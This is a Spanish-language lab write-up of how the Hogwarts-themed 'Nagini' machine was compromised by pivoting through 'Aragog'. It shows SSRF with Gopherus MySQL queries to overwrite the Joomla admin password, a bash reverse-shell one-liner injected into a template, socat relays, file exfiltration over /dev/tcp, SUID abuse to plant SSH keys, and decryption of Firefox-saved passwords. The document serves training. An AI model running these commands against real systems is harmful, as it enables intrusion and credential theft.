[[10.10.0.4 (Aragog)]]
- Pwned #Nagini
`#CSRF` `#HTTP3`
Hacemos un scaneo con [[NMAP]] para ver los puertos abiertos:
`nmap -sT -Pn --top-ports 500 --open -T5 -v -n 10.10.0.5`

```python
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Podemos agilizar la búsqueda mas si usamos un secuenciador junto con xargs
`seq 1 65535 | xargs -P 700 -I {} nmap -sT -Pn -p{} -open -T5 -n -v 10.10.0.5 | grep "tcp open"`

Navegaremos a la pagina web que nos muestra que esta levantada en el puerto `80`
Vemos información sobre la web con la herramienta con [[WHATWEB]]
`whatweb http://10.10.0.5/`
```python
http://10.10.0.5/ [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.0.5]
```

Vamos a hacer fuzzing sobre la web con la herramienta [[GOBUSTER]]
`gobuster dir -u http://10.10.0.5/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 20 -x html,php,txt`
Este nos encontrara los siguientes ficheros
`index.html`
`/joomla`
`note.txt` con el siguiente contenido:
```txt
Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin
```

Esto nos indica que se esta usando `HTTP3` que es la tercera versión de HTTP utiliza un puerto UDP
Usaremos la herramienta de quiche con la tool de `./http3-client` como en esta caso no conseguía utilizarla seguí el siguiente paso del video en el que se descubre la ruta:
`/internalResourceFeTcher.php` así que accedemos a ella desde el navegador

Vemos que la URL esta en método get, así que usando la opción 
`?url=` podremos traer al navegador actual por ejemplo llamar a `http://localhost` nos muestra la web del localhost, al igual que podemos cargar la web de la maquina [[10.10.0.4 (Aragog)]] aunque no cargue la imagen. Esto acontece un SSRF (Server Side Request Forgery) y lo podemos usar para enumerar los puertos y servicios internos de la maquina.

Para poder tener conectividad con nuestra maquina atacante lo que haremos sera descargar `socat` y nos lo trasferiremos a la maquina intermedia 192.168.1.23  [[10.10.0.4 (Aragog)]]
Le daremos permisos de ejecución y ejecutaremos la herramienta de la siguiente forma:
`./socat TCP-LISTEN:4343,fork TCP:192.168.1.19:80`
Estamos indicando que todo lo que se pida por el puerto 4343 lo envié a través de la ip de 192.168.1.23  por el puerto 80

En nuestra maquina atacante levantaremos un servidor con python y desde la web de la maquina [[10.10.0.5(Nagini)]] en la url encontrada probamos a acceder a la maquina [[10.10.0.4 (Aragog)]] por el puerto 4343 que es el que le hemos indicado en socat

Ahora desde dentro de la url como tenemos levantado nuestro servidor de python y habilitado todo lo que es el pivoting y el renvió de paquetes intentamos acceder por la url a u8n archivo que creemos en nuestra maquina atacante que se llame `pwned.php` y ver si lo interpreta.

Como no lo interpreta, también encontramos el directorio `/joomla` así que navegamos a el. Usaremo0s la herramienta joomscan para hacer enumeración de vulnerabilidades.
`joomscan -u http://10.10.0.5/joomla/`

La respuesta de la ejecución de esta herramienta nos muestra que esta expuesta la interfaz del administrador `http://10.10.0.5/joomla/administrator/`

También nos encuentra un archivo .bak `http://10.10.0.5/joomla/configuration.php.bak`
Nos lo intentamos descargar para ver su contenido con: `curl -s -X GET http://10.10.0.5/joomla/configuration.php.bak > configuration.php`

Vemos que es un archivo de configuración de la base de datos
Usaremos `gopher` que te permite enumerar bases de datos desde `gopher://` 
Nos clonaremos el repositorio: `git clone https://github.com/tarunkant/Gopherus`
Le damos permisos de ejecución al archivo .py y luego hacemos un enlace simbólico para poder llamarlo desde cualquier parte del sistema: `ln -sf $(pwd)/gopherus.py /usr/local/bin/gopherus`

Ejecutaremos la herramienta con:
`gopherus --exploit mysql` introducimos el nombre de usuario que hemos encontrado en el archivo .bak
Ahora deberemos indicar que QUERY queremos ejecutar por ejemplo, enumerar las bases de datos:
`SHOW databases;`
Y nos muestra una URL a la que podemos acceder desde el navegado donde esta la web que nos permitía inyectar URL en `http://10.10.0.5/internalResourceFeTcher.php`
Tendremos que recargar la pagina varias veces hasta que nos muestre la información, vemos que hay una base de datos llamada joomla, así que ahora enumeraremos las tablas de esa base de datos.
Volvemos a usar el usuario encontrado pero en la QUERY usaremos: `USE joomla; show tables;`

La URL que nos muestra, la volvemos a copiar y la metemos en la pagina de `http://10.10.0.5/internalResourceFeTcher.php` y vemos que hay una tabla de usuarios `joomla_users`

Ahora enumeraremos esa tabla con la misma herramienta y la QUERY: `USE joomla; describe joomla_users;`, vemos que hay columnas de usuario, mail, password, etc...

Nuestra nueva QUERY será: `USE joomla; select name,username,email,password from joomla_users;` y nos mostrara la contraseña del usuario administrador de forma crakeada:
`$2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay`

Intentaremos crakearlas con [[JOHN THE RIPPER]]: `john --wordlist=/usr/share/wordlists/rockyou.txt hash` 
No vamos a conseguir crakearla así que intentaremos alterar los datos de los usuarios atreves de la herramienta de Gopherus con la siguiente QUERY: `USE joomla; update joomla_users set password='482c811da5d5b4bc6d497ffa98491e38' where username='site_admin';`

El hash de MD5 lo hemos creado a través de la siguiente ejecución: `echo -n "password123" | md5sum` 

Lo volvemos a meter en nuestra web en la que estamos trabajando y nos dice que se ha ejecutado un cambio, ahora en el panel de administración de joomla en la parte del login intentamos acceder con el usuario `site_admin::pasword123` y conseguiremos acceso al panel de administración.

La intrusión se realiza a través de los templates, alojados en la pestaña de Extensions, y se modificara la plantilla de `erro.php`
En la plantilla realizaremos un oneLiner para traernos una bash a nustra maquina atacante, pero como no llega lo tenemos que enviar al nodo mas cercano que en esta caso es [[10.10.0.4 (Aragog)]]:
`system("bash -c'bash -i >& /dev/tcp/10.10.0.4/1111 0>&1'");`

Guardamos el archivo dándole a save. 
Nos conectaremos por SSH a la maquina ARAGOG `ssh root@192.168.1.23`
En nuestra maquina nos pondremos en escucha por el puerto 443 `nc -nlvp 443`

Ahora en la maquina ARAGOG usaremos el socat para redirigir todo el trafico que le entre a ella por el puerto `1111` que lo redirija al `443` de nuestra maquina atacante que es donde estamos nosotros en escucha.

Obtendremos una shell, entonces realizaremos un tratamiento de esta.

Vemos en los home de los usuarios y el usuario `snape`, tiene un fichero `.creds.txt` que contiene la contraseña de su usuario en base64 así que la decodeamos: `cat .creds.txt | base64 -d; echo`
Nos dará como respuesta `Love@lilly`

En el directorio del home de `hermoine` hay una ruta a `./bin/su_cp` con permisos SUID
Es una copia de binario copy del propio sistema, esto nos puede permitir copiarnos archivos a rutas en los que no tenemos capacidad de escritura con el usuario hermione.

Así que vamos a copiarnos nuestra clave publica en el directorio `/tmp/authorized_keys` 
Ahora nos aprovecharemos del binario SUID realizando una copia de ese archivo en el home de hermoine:
`./su_cp /tmp/authorized_keys /home/hermoine/.ssh/authorized_keys`

Ahora si nos salimos de la maquina nos podremos conectar por ssh: `ssh hermoine@10.10.0.5` y obtendremos una shell como el usuario hermoine

En el directorio home de este usuario vemos que hay un directorio `.mozilla/firefox` el cual almacena un perfil de un usuario `g2mhbq0o.default` en el cual en el fichero `logins.json` vemos que se encuentra la contraseña encriptada: `MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECAGAbZHd/uQkBBD9Ftg4gxw85Lco5YQ8g1wt`

Usaremos la herramienta `https://github.com/lclevy/firepwd`
Primero nos tendremos que transferir a nuestra maquina atacante el archivo `key4.db` y el archivo `logins.json`

Nos lo trasferiremos de la siguiente manera:
1.- en la maquina hermoine buscamos el nodo mas cercano en este caso la 10.10.0.4(Aragog)
2.- Nos lo transferimos por el puerto `4646` con `cat < logins.json > /dev/tcp/10.10.0.4/4646`
3.- En la maquina Aragog redirigimos con socat la conexión a la maquina atacante `./socat TCP-LISTEN:4646,fork TCP:192.168.1.21:1215`
4.- En la maquina atacante nos ponemos en escucha con [[NETCAT]] `nc -nlvp 1215 > logins.json`

Haremos el mismo procedimiento para los dos archivos

Ejecutamos el fyrepwd y nos mostrara la contraseña y usuario en texto claro `root::@Alohomora#123`

Y habremos obtenido una shell como root




















